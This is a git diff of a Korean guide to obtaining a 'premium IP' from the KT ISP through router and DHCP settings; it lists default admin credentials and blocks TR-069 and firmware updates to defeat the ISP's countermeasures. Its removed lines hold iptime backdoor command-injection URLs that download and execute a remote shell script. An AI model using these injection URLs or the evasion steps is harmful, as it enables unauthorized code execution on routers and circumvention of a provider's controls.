@@ -165,10 +165,9 @@ OPNsense에서 WAN 인터페이스에 Option 60을 추가하려면 다음과 같
 --------------------------------
 
 
-# ⚠️ 아래부터는 ROKFOSS 프로젝트에서 관리하지 않는 부분입니다.
-
-> [!WARNING]
-> 가정용 공유기는 [원본](https://github.com/veilRedeemer/bypassQoSKoreatelecomISP) 문서에서 확인하실 수 있습니다.
+> [!CAUTION]
+> ### ⚠️ 아래부터는 ROKFOSS 프로젝트에서 관리하지 않는 부분입니다
+> 누락되거나 변경되지 않은 내용이 남아있으며 내용이 다르거나 가정용 공유기의 경우 [원본](https://github.com/veilRedeemer/bypassQoSKoreatelecomISP)의 방법을 따라야합니다.
 
 
 ## KT GiGA WiFi (통신사 Router, 기본값 설정인 KT 모드가 필요)
@@ -198,7 +197,7 @@ __KT GiGA WiFi 사용자 설정 페이지 - 상태정보의 로그('Update' 또�
 
 --------------------------------
 
-ASUSWRT(아수스 공유기, 이중 NAT 구성에서 사용할 수 없음) - http://www.asusrouter.com 에서 초기 설정 시 입력한 관리자 계정과 암호를 입력 후
+### ASUSWRT(아수스 공유기, 이중 NAT 구성에서 사용할 수 없음) - http://www.asusrouter.com 에서 초기 설정 시 입력한 관리자 계정과 암호를 입력 후
  1. 아래 링크의 자동 IP - c단락을 참고하거나,
  2. 아래 스크린샷을 참고하여
 
@@ -207,7 +206,7 @@ https://www.asus.com/kr/support/faq/1011715/
 ![asuswrt2a](https://github.com/user-attachments/assets/c8936908-946f-40d5-9a8e-b480b0ce658b)
 
 --------------------------------
-수동IP설정
+### 수동IP설정
 
 **각 기기**는 수동IP설정 적용 후, 다른 WiFi 연결 또는 다른 공유기와 연결 시 네트워크/인터넷에 연결할 수 없는 경우가 있으며 이 때 해당 설정을 원래대로(자동/DHCP) 되돌리세요. **각 기기**마다 설정 방법이 다를 수 있습니다
 
@@ -234,12 +233,9 @@ __변경 사항은 다음에 유선 또는 무선으로 연결될 때 적용되�
 
 (분기 끝)
 
---------------------------------
 
 변경 사항이 적용된 후, https://icanhazip.com 와 같은 외부 서비스를 사용하여 외부 IP주소를 확인하면 기존과 다른 '프리미엄 IP'가 할당된 것을 확인할 수 있으며, 프리미엄 IP에서도 포트 포워딩을 사용할 수 있습니다.
 <img width="1080" alt="GiGAWifi_premiumip" src="https://github.com/user-attachments/assets/280c972c-cc1d-4ca3-bf41-ac8a4e77b74c" />
-
---------------------------------
 
 마무리로서, 해당 방법의 사용을 저지하려는 시도 중 일부를 방지하기 위해 GiGA WiFi의 자동 펌웨어 업그레이드와 TR-069 통신을 차단 **(일부 기기만 지원)** 합시다
 
@@ -249,51 +245,33 @@ __변경 사항은 다음에 유선 또는 무선으로 연결될 때 적용되�
 
 <img width="497" alt="FWUpgradeBlocking_2" src="https://github.com/user-attachments/assets/05a0f3bb-f7c1-4724-9ba3-203dc0093c36" />
 
-
---------------------------------
-
-넷기어 (예시로서 나이트호크 RAX80) -
-
+### 넷기어 (예시로서 나이트호크 RAX80)
 <img width="1424" alt="Nighthawk_RAX80" src="https://github.com/user-attachments/assets/c5c1ba09-4d63-4d28-8e2b-3f1344e36719" />
 
---------------------------------
-
-시놀로지RT (예시로서 RT1900ac) - 
+### 시놀로지RT (예시로서 RT1900ac)
 
 ![RT1900ac](https://github.com/user-attachments/assets/5ea5243e-821a-42c5-a18d-e3f2dcd5319e)
 
---------------------------------
+### KT GiGA WiFi에서 수동IP설정 대신 '수동 IP 할당 설정'(DHCP 정적 할당, 일부 기기만 지원) 을 사용하기
+KT GiGA WiFi와 연결된 기기에서 http://172.30.1.254:8899 , 구성되지 않은 경우 ID는 ktuser , 비번은 megaap 또는 homehub 로 로그인 후 새로운 사용자 이름과 비번을 설정하여 사용자 설정 페이지에 접근할 수 있습니다:
 
-OpenWrt - 
+장치설정 - 네트워크 관리 - LAN 연결 설정
 
+머큐리 - 148을 지우고 252를 입력한 다음, 적용 버튼을 누르지 않고 각 기기의 MAC 주소와 172.30.1.149부터 172.30.1.252까지의 범위 중 다른 기기와 중복되지 않는 IP 주소를 입력하여 설정을 추가
+
+다보링크 - 148을 지우고 252를 입력한 다음, 적용 버튼을 누르고 각 기기의 MAC 주소와 172.30.1.149부터 172.30.1.252까지의 범위 중 다른 기기와 중복되지 않는 IP 주소를 입력하여 설정을 추가
+
+WiFi 6D/6E/7D 이후 기기는 네트워크 - 네트워크 설정 - LAN 연결 설정
+
+KB01-411H - 각 기기의 MAC 주소와 172.30.1.149부터 172.30.1.252까지의 범위 중 다른 기기와 중복되지 않는 IP 주소를 입력하여 설정을 추가
+
+<img src="https://private-user-images.githubusercontent.com/210660759/449745367-9d7bda7f-f1a5-4663-8435-f91347cf6cbf.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3OTI4MDAyNjQsIm5iZiI6MTc5Mjc5OTk2NCwicGF0aCI6Ii8yMTA2NjA3NTkvNDQ5NzQ1MzY3LTlkN2JkYTdmLWYxYTUtNDY2My04NDM1LWY5MTM0N2NmNmNiZi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjYxMDIzJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI2MTAyM1QyMzU5MjRaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1jOGQ2NzAzNjQ2ODQxZTQxNjA0MzBlMWIwY2QzMzRjMGU4NDZmZWZmZGI3M2NhZDhmZmE3ODY4Njk1OTNiNDYxJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCZyZXNwb25zZS1jb250ZW50LXR5cGU9aW1hZ2UlMkZwbmcifQ.tXE5GwAH8T_cn3cYRXh3jb1M5lQ2yKP-EqYYVS2IhuY">
+
+### OpenWrt
 https://archive.md/VRZIO
 
-
-iptime(알파테스트중)
-
-백도어 출처 - https://github.com/tylzars/iptime-debug - 펌웨어 버전 15.10.0, ipTIME A2004S에서 동작 확인됨
-
-위 출처와 같이 iptime 공유기의 '원격 지원'기능에 잠재된 백도어에 접근할 방법이 있는 경우에만 유효합니다
-
-<a href="https://github.com/veilRedeemer/udhcp/releases">미리 빌드된 udhcpc 출처</a>
-
-1. 적용하려는 기기는 '악성 스크립트 접근 방지(CSRF)'기능이 꺼져 있으며, '원격 지원'기능이 켜져 있어야 합니다:
-<img width="285" alt="iptime1" src="https://github.com/user-attachments/assets/ef4882cc-03a4-4478-acd1-a0418048dca0" />
-
-2. 아래 링크 중 하나를 직접 클릭하지 말고 로그인한 관리자 페이지의 주소 칸에 붙여넣어 진행하세요. 관리자 계정/비밀번호를 설정하지 않은 경우 동작하지 않습니다:
-
-http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=wget%20-O%20%2ftmp%2fstart.sh%20https%3a%2f%2fraw.githubusercontent.com%2fveilRedeemer%2fbypassQoSKoreatelecomISP%2frefs%2fheads%2fmain%2fiptime_bootstrap.sh%20%3bchmod%20755%20%2ftmp%2fstart.sh%20%3b%2ftmp%2fstart.sh
-
-  이때 아래와 같은 메시지가 표시된다면 원본 링크의 암호화된 연결을 지원하지 않는 환경이므로 각자 웹서버를 준비하거나 아래에 미리 준비된 미러 링크를 사용해야 합니다
-   
-<img width="498" alt="notls" src="https://github.com/user-attachments/assets/6ee27eda-0b7f-4213-a868-7a118907b1d3" />
-
-   미러 링크는 접속자의 IP 주소와 타임스탬프를 포함한 접속 기록을 저장함에 동의하고 미러 링크를 사용:
-
-http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=wget%20-O%20%2ftmp%2fstart.sh%20http%3a%2f%2f168.138.196.144%2fiptime_bootstrap.sh%20%3bchmod%20755%20%2ftmp%2fstart.sh%20%3b%2ftmp%2fstart.sh
-
-3. 아래와 같이 표시되면 성공. 다운로드한 데이터를 포함한 변경 사항은 특정 공유기 설정을 변경하거나 재시동되거나 전원이 끊어지면 지워집니다:
-<img width="333" alt="iptime2" src="https://github.com/user-attachments/assets/fa6ee8d4-9990-4f80-8d70-8ad551737b36" />
+### iptime
+iptime의 경우 ROKFOSS PROJECT에서 관리하지 않습니다. [원본](https://github.com/veilRedeemer/bypassQoSKoreatelecomISP)에 있는 방법으로 시도하세요.
 
 성공적으로 프리미엄 IP를 취득했거나 실패했다면 기기 모델명과 펌웨어 버전, 미러 다운로드 주소 사용여부, 실패 시 출력되는 메세지를 3570kgen@naver.com 에 제보하는 것을 고려해보세요.
 
